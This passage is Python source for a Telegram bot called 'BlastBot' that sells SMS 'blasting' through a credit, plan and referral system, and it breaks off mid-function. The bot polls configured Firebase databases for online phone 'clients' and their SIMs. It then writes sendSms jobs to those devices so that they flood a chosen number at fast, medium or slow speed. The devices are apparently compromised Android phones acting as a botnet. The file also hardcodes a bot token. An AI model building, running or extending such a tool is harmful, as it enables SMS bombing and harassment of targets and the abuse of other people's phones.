import asyncio
import html
import json
import logging
import os
import random
import string
import time
from datetime import datetime

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"      # 🔥
EMOJI_STAR = "5372849966689566579"      # ⭐
EMOJI_ROCKET = "5359664288241829619"    # 🚀
EMOJI_CROWN = "6237927637906364256"     # 👑
EMOJI_SHIELD = "6235476345451716705"    # 🛡
EMOJI_MONEY = "6244678063775289843"     # 💰
EMOJI_PHONE = "6239930832128056797"     # 📱
EMOJI_CHECK = "4958689671950369798"     # ✅
EMOJI_CROSS = "4958900559139570572"     # ❌
EMOJI_WARNING = "4958526153955476488"   # ⚠️
EMOJI_LOCK = "4956719506027185156"      # 🔒
EMOJI_GIFT = "5084613633418199991"      # 🎁
EMOJI_BELL = "5098265504796115765"      # 🔔
EMOJI_GEAR = "5116414868357907335"      # ⚙️
EMOJI_VIDEO = "5372849966689566579"     # 📹

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789",
)


def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)


def esc(text: object) -> str:
    return html.escape(str(text or ""))


def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{esc(fallback)}</tg-emoji>'
    return esc(fallback)


def btn(
    text: str,
    callback_data: str,
    emoji_id: str = None,
    fallback_emoji: str = "",
    style: str = None,
) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs = {"text": label, "callback_data": callback_data}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ("primary", "success", "danger"):
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)


def btn_url(
    text: str,
    url: str,
    emoji_id: str = None,
    fallback_emoji: str = "",
    style: str = None,
) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    kwargs = {"text": label, "url": url}
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style in ("primary", "success", "danger"):
        kwargs["style"] = style
    return InlineKeyboardButton(**kwargs)


def style_btn(
    text: str,
    style: str = "primary",
    request_contact: bool = False,
    request_location: bool = False,
) -> KeyboardButton:
    kb_btn = KeyboardButton(
        text=sc(text),
        request_contact=request_contact,
        request_location=request_location,
    )
    if style in ("primary", "success", "danger"):
        try:
            setattr(kb_btn, "style", style)
        except Exception:
            pass
    return kb_btn


def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")],
        ],
        resize_keyboard=True,
    )


MAIN_OWNER = 8241730977
SUPER_ADMIN_NAME = "@Sakira540"
SUPER_ADMIN_LINK = "https://t.me/+2irJsQDVbphiNzI1"
SUPER_ADMINS = [8241730977]

BOT_TOKEN = os.getenv("BOT_TOKEN", "9273864914:AAGSMztMHacgkv_nhGhBNwo9EYzmnDxE_fQ")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1004437456868"))

_DATA_FILE = "blast_bdata.json"
_VERSION = "v3-FLEXXYYY-PRO"
_PROGRESS_UPDATE_INTERVAL = 0.75
_BACKGROUND_SCAN_INTERVAL = 60.0
_AUTO_MSG_INTERVAL = 60.0

SPEED_FAST = 0.02
SPEED_MEDIUM = 0.15
SPEED_SLOW = 0.45
SPEED_DEFAULT = SPEED_MEDIUM

HTTP_SESSION: aiohttp.ClientSession = None
FILE_IO_LOCK = asyncio.Lock()


async def get_http_session() -> aiohttp.ClientSession:
    global HTTP_SESSION
    if HTTP_SESSION is None or HTTP_SESSION.closed:
        timeout = aiohttp.ClientTimeout(total=10, connect=4)
        HTTP_SESSION = aiohttp.ClientSession(timeout=timeout)
    return HTTP_SESSION


async def close_http_session():
    global HTTP_SESSION
    if HTTP_SESSION and not HTTP_SESSION.closed:
        try:
            await HTTP_SESSION.close()
        except Exception:
            pass
    HTTP_SESSION = None


async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        session = await get_http_session()
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
        async with session.post(url, json=payload) as resp:
            res = await resp.json()
            if res.get("ok"):
                msg_id = res["result"]["message_id"]
                await asyncio.sleep(1.8)
                del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                async with session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id}):
                    pass
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")


async def play_startup_aesthetic(bot: Bot, chat_id: int):
    """Animated build-up screen: BOT MADE BY FLEXXYYY + Welcome."""
    frames = [
        (
            f"✨ <b>{sc('initializing core engine...')}</b> ✨\n"
            f"<code>[■□□□□□□□□□] 10%</code>\n"
            f"{em(EMOJI_FIRE, '🔥')} {sc('loading aesthetic modules...')}"
        ),
        (
            f"💎 <b>{sc('crafting premium interface...')}</b> 💎\n"
            f"<code>[■■■■■□□□□□] 50%</code>\n"
            f"{em(EMOJI_STAR, '⭐')} {sc('syncing nodes & channels...')}"
        ),
        (
            f"👑✨ <b>{sc('bot made by flexxxyyy')}</b> ✨👑\n"
            f"<code>[■■■■■■■■■■] 100%</code>\n\n"
            f"🔥 <b>{sc('welcome hai hamare bot mai!')}</b> 🔥\n"
            f"{em(EMOJI_CROWN, '👑')} <b>{sc('creator')}:</b> <code>FLEXXYYY</code> ({esc(SUPER_ADMIN_NAME)})"
        ),
    ]
    sent_msg = None
    try:
        sent_msg = await bot.send_message(chat_id, frames[0], parse_mode="HTML")
        for frame in frames[1:]:
            await asyncio.sleep(0.55)
            try:
                await sent_msg.edit_text(frame, parse_mode="HTML")
            except TelegramBadRequest:
                pass
    except Exception as e:
        log.warning(f"Startup animation skipped: {e}")


async def send_channel_log(bot: Bot, text: str):
    try:
        if LOG_CHANNEL_ID:
            await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")


class UserSession:
    __slots__ = ["uid", "cancelled", "sent", "failed", "task", "start_time", "lock", "number", "target_uid"]

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None


USER_SESSIONS: dict[int, UserSession] = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES: list[dict] = []
CACHE_LOCK = asyncio.Lock()
LAST_SCAN_TIME = 0.0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG: list[dict] = []
FB_DEVICE_COUNTS: dict[str, dict] = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS: dict[str, int] = {}
AUTO_MSG_TASK: asyncio.Task = None


class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    auto_msg_text = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()


def _default_user_record(name: str = "User", credits: int = 0) -> dict:
    return {
        "name": name,
        "uses": 0,
        "credits": credits,
        "joined_at": int(time.time()),
        "refer_code": None,
        "referred_by": None,
        "sms_history": [],
    }


def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "auto_msg": {
            "enabled": False,
            "text": "",
            "last_sent_ids": {},
            "updated_at": 0,
        },
    }


def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            if not isinstance(data, dict):
                data = _default_data()
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if not isinstance(data.get("auto_msg"), dict):
                data["auto_msg"] = default["auto_msg"]
            for ak, av in default["auto_msg"].items():
                if ak not in data["auto_msg"]:
                    data["auto_msg"][ak] = av
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                base = _default_user_record(u.get("name", "User"), u.get("credits", 0))
                for uk, uv in base.items():
                    if uk not in u:
                        u[uk] = uv
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d


def save(d: dict):
    tmp_file = f"{_DATA_FILE}.tmp"
    try:
        with open(tmp_file, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
        os.replace(tmp_file, _DATA_FILE)
    except Exception as e:
        log.error(f"Save error: {e}")


def sync_runtime_state(d: dict):
    global PROTECTED_NUMBERS
    raw_prot = d.get("protected_numbers", {})
    if isinstance(raw_prot, dict):
        PROTECTED_NUMBERS = dict(raw_prot)


def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    clean_name = name or "User"
    if k not in d["users"]:
        d["users"][k] = _default_user_record(clean_name, 0)
        return True
    d["users"][k]["name"] = clean_name
    return False


def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append(
        {
            "timestamp": int(time.time()),
            "uid": uid,
            "action": action,
            "details": details,
        }
    )
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]


def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER


def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS


def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])


def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])


def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False


def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid):
        return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d):
        return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []):
        return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []):
        return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"):
        return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"


def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)


def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    users = d.setdefault("users", {})
    if k not in users or not isinstance(users[k], dict):
        users[k] = _default_user_record(f"User {uid}", 0)
    users[k]["credits"] = users[k].get("credits", 0) + amount


def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    users = d.get("users", {})
    if k in users and isinstance(users[k], dict):
        current = users[k].get("credits", 0)
        if current >= amount:
            users[k]["credits"] = current - amount
            return True
    return False


def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    users = d.setdefault("users", {})
    if k not in users:
        users[k] = _default_user_record(f"User {uid}", 0)
    if users[k].get("refer_code"):
        return users[k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in users.values() if isinstance(u, dict))
        if not exists:
            break
    users[k]["refer_code"] = code
    return code


def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if isinstance(udata, dict) and udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d.get("users", {}).get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid


async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")


def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
            for row in rows
        ]
    )


def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="success"),
                btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
                btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="primary"),
            ],
            [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")],
        ]
    )


def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, max(0, int(width * current / total)))
    return "█" * filled + "░" * (width - filled)


def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = min(100, int(((sent + failed) / total) * 100)) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{esc(speed_label)}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)


def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[[btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]]
    )


def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]


def fmt_time(ts: int) -> str:
    if not ts:
        return "N/A"
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")


def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"


def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME
    if time_diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴅᴇᴠɪᴄᴇs"
    if time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff / 60)}ᴍ ᴏʟᴅ)"
    return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴅᴇᴠɪᴄᴇs ({int(time_diff / 60)}ᴍ ᴏʟᴅ)"


async def check_firebase_health(fb: dict) -> tuple[bool, str]:
    """Checks if a Firebase RTDB URL is valid, reachable, and not permission-denied/expired."""
    url = str(fb.get("url", "")).strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        return False, "Invalid URL scheme"
    probe_url = f"{url}/clients.json?shallow=true"
    try:
        session = await get_http_session()
        async with session.get(probe_url, timeout=aiohttp.ClientTimeout(total=6)) as r:
            txt = (await r.text()).strip()
            if r.status == 200:
                if "Permission denied" in txt or "error" in txt.lower() and txt.startswith("{"):
                    return False, "Permission denied / Expired"
                return True, "OK"
            if r.status in (401, 403, 404, 410):
                return False, f"HTTP {r.status}"
            return False, f"Status {r.status}"
    except Exception as e:
        return False, str(e)[:25]


async def cleanup_bad_firebases(d: dict) -> tuple[list, list]:
    """Returns (healthy_fbs, removed_fbs_with_reason)."""
    fbs = d.get("firebases", [])
    healthy = []
    removed = []

    async def _check(item):
        ok, reason = await check_firebase_health(item)
        return item, ok, reason

    results = await asyncio.gather(*(_check(fb) for fb in fbs))
    for item, ok, reason in results:
        if ok:
            healthy.append(item)
        else:
            removed.append((item, reason))
    return healthy, removed


async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG

    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False

    while True:
        try:
            async with SCAN_LOCK:
                if SCANNING_IN_PROGRESS:
                    await asyncio.sleep(5)
                    continue
                SCANNING_IN_PROGRESS = True

            SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
            start_scan = time.time()

            d = load()
            sync_runtime_state(d)
            fbs = d.get("firebases", [])

            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                async with CACHE_LOCK:
                    CACHED_DEVICES = []
                FB_DEVICE_COUNTS.clear()
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan

            async with CACHE_LOCK:
                CACHED_DEVICES = devices

            current_fb_ids = {fb["id"] for fb in fbs}
            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time()),
                }
            for stale in [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]:
                FB_DEVICE_COUNTS.pop(stale, None)

            LAST_SCAN_TIME = time.time()

            health_entry = {
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices",
            }
            DEVICE_HEALTH_LOG.append(health_entry)
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"
                log.info(f"[BG-SCAN] {len(devices)} devices online | {len(fbs)} DBs | {scan_duration:.1f}s")

                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ-sᴄᴀɴ: ᴇᴠᴇʀʏ <b>1 ᴍɪɴᴜᴛᴇ</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇ: <b>{scan_duration:.1f}s</b>\n\n"
                            f"<i>{sc('bot is now running in ultra mode with per-user sessions.')}</i>",
                            parse_mode="HTML",
                        )
                    except Exception as e:
                        log.warning(f"Owner notify failed: {e}")
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ | ʟᴀsᴛ: {fmt_time(int(time.time()))}"

        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {esc(str(e)[:30])}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)


async def auto_broadcast_worker(bot: Bot):
    """Every 60s, deletes previous auto message per user and sends the latest auto message."""
    log.info("Auto 1-Min Broadcast Worker STARTED")
    while True:
        try:
            d = load()
            auto_cfg = d.get("auto_msg", {})
            if auto_cfg.get("enabled") and str(auto_cfg.get("text", "")).strip():
                raw_text = str(auto_cfg["text"]).strip()
                last_ids = auto_cfg.setdefault("last_sent_ids", {})
                users = d.get("users", {})
                banned = set(d.get("banned", []))
                changed = False

                payload_text = (
                    f"{em(EMOJI_BELL, '🔔')} <b>{sc('auto update')}</b>\n\n"
                    f"{esc(raw_text)}\n\n"
                    f"<i>{em(EMOJI_GEAR, '⏱')} {sc('refreshes every 1 minute')}</i>"
                )

                for uid_str in list(users.keys()):
                    try:
                        uid = int(uid_str)
                    except ValueError:
                        continue
                    if uid in banned:
                        continue

                    prev_mid = last_ids.get(uid_str)
                    if prev_mid:
                        try:
                            await bot.delete_message(chat_id=uid, message_id=int(prev_mid))
                        except Exception:
                            pass

                    try:
                        sent = await bot.send_message(uid, payload_text, parse_mode="HTML")
                        last_ids[uid_str] = sent.message_id
                        changed = True
                    except Exception:
                        pass

                    await asyncio.sleep(0.04)

                if changed:
                    save(d)
        except Exception as e:
            log.error(f"[AUTO-MSG] Worker error: {e}")

        await asyncio.sleep(_AUTO_MSG_INTERVAL)


async def get_cached_devices() -> list:
    async with CACHE_LOCK:
        return list(CACHED_DEVICES)


async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        session = await get_http_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
            if r.status == 200:
                txt = (await r.text()).strip()
                if not txt or txt == "null":
                    return {}
                return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get {url}: {e}")
    return {}


async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    session = await get_http_session()
    for attempt in range(3):
        try:
            async with session.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                if 200 <= r.status < 300:
                    return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt + 1}: {e}")
        await asyncio.sleep(0.35 * (attempt + 1))
    return False


def device_is_online(device_data: dict) -> bool:
    return any(
        [
            device_data.get("isOnline"),
            device_data.get("online"),
            device_data.get("connected"),
            device_data.get("status") in ("online", "active", True, 1),
        ]
    )


async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    async with CACHE_LOCK:
        global CACHED_DEVICES
        CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]

    _dev_sem = asyncio.Semaphore(15)
    session = await get_http_session()

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with session.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200:
                    return
                txt = (await r.text()).strip()
                if not txt or txt == "null":
                    return
                device_ids = json.loads(txt)
                if not isinstance(device_ids, dict):
                    return

                async def fetch_dev(dev_id: str):
                    try:
                        url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                        async with _dev_sem:
                            async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                if r2.status == 200:
                                    txt2 = (await r2.text()).strip()
                                    if not txt2 or txt2 == "null":
                                        return None
                                    dev_data = json.loads(txt2)
                                    if isinstance(dev_data, dict) and device_is_online(dev_data):
                                        name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                        sims = dev_data.get("sims", [])
                                        return {
                                            "fb_id": fb["id"],
                                            "fb_url": fb["url"],
                                            "fb_label": fb.get("label", fb["url"][:30]),
                                            "dev_id": dev_id,
                                            "dev_name": name,
                                            "sims": sims,
                                        }
                    except Exception as e:
                        log.warning(f"Device fetch {dev_id}: {e}")
                    return None

                dev_ids = list(device_ids.keys())
                for i in range(0, len(dev_ids), 20):
                    batch = dev_ids[i : i + 20]
                    dev_results = await asyncio.gather(*(fetch_dev(dev_id) for dev_id in batch))
                    for res in dev_results:
                        if res:
                            results.append(res)
        except Exception as e:
            log.warning(f"fb_shallow_get {fb['url']}: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results


async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time()),
        },
    )


async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False


async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing


def force_join_text(missing: list) -> str:
